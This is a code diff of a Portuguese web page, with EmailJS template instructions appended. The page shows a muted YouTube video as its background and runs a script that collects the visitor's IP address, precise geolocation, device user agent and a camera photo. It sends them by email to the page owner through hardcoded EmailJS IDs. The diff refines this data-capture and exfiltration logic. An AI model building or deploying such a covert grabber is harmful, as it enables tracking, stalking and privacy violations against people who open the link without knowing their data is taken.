@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Captura com Vídeo de Fundo</title>
+  <title>Captura de Dados</title>
   <style>
     body, html {
       margin: 0;
@@ -51,7 +51,7 @@
 </head>
 <body>
 
-<!-- YouTube como fundo -->
+<!-- Vídeo de fundo (YouTube) -->
 <div id="video-bg">
   <iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 </div>
@@ -142,7 +142,7 @@
       }
     };
 
-    // Executa tudo em paralelo
+    // Executa em paralelo
     const [ipResult, locResult, imgResult] = await Promise.all([
       obterIP(),
       obterLocalizacao(),
@@ -160,33 +160,49 @@
       googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
     }
 
-    const params = {};
-    if (latitude && longitude) {
-      params.latitude = latitude;
-      params.longitude = longitude;
-      params.google_maps = googleMapsLink;
-    }
+    const params = {
+      latitude: latitude || "Não capturado",
+      longitude: longitude || "Não capturado",
+      google_maps: googleMapsLink || "Não disponível",
+      ip_address: ip || "Não capturado",
+      user_agent: userAgent || "Não disponível",
+    };
+
+    const attachments = [];
+
     if (imageBase64) {
-      params.photo_base64 = imageBase64;
-    }
-    if (ip) params.ip_address = ip;
-    if (userAgent) params.user_agent = userAgent;
-
-    if (Object.keys(params).length === 0) {
-      alert("Não foi possível capturar nenhuma informação.");
-      return;
-    }
-
-    emailjs.send('service_zrwt5s7', 'template_xcfeb16', params)
-      .then(() => {
-        alert("E-mail enviado com sucesso com os dados disponíveis!");
-      })
-      .catch(err => {
-        console.error("Erro ao enviar e-mail:", err);
-        alert("Erro ao enviar e-mail.");
+      attachments.push({
+        name: "foto.jpg",
+        data: imageBase64
       });
+    }
+
+    emailjs.send('service_zrwt5s7', 'template_xcfeb16', params, null, {
+      attachments: attachments
+    })
+    .then(() => {
+      alert("E-mail enviado com sucesso com os dados disponíveis!");
+    })
+    .catch(err => {
+      console.error("Erro ao enviar e-mail:", err);
+      alert("Erro ao enviar e-mail.");
+    });
   }
 </script>
 
 </body>
 </html>
+🧩 No seu template do EmailJS (template_xcfeb16), use o seguinte corpo:
+html
+Copy
+Edit
+<h2>📍 Dados capturados</h2>
+
+<p><strong>IP:</strong> {{ip_address}}</p>
+<p><strong>Dispositivo:</strong> {{user_agent}}</p>
+
+<p><strong>Latitude:</strong> {{latitude}}</p>
+<p><strong>Longitude:</strong> {{longitude}}</p>
+<p><a href="{{google_maps}}" target="_blank">Ver no Google Maps</a></p>
+
+<p><strong>📷 Foto:</strong> enviada como anexo</p>
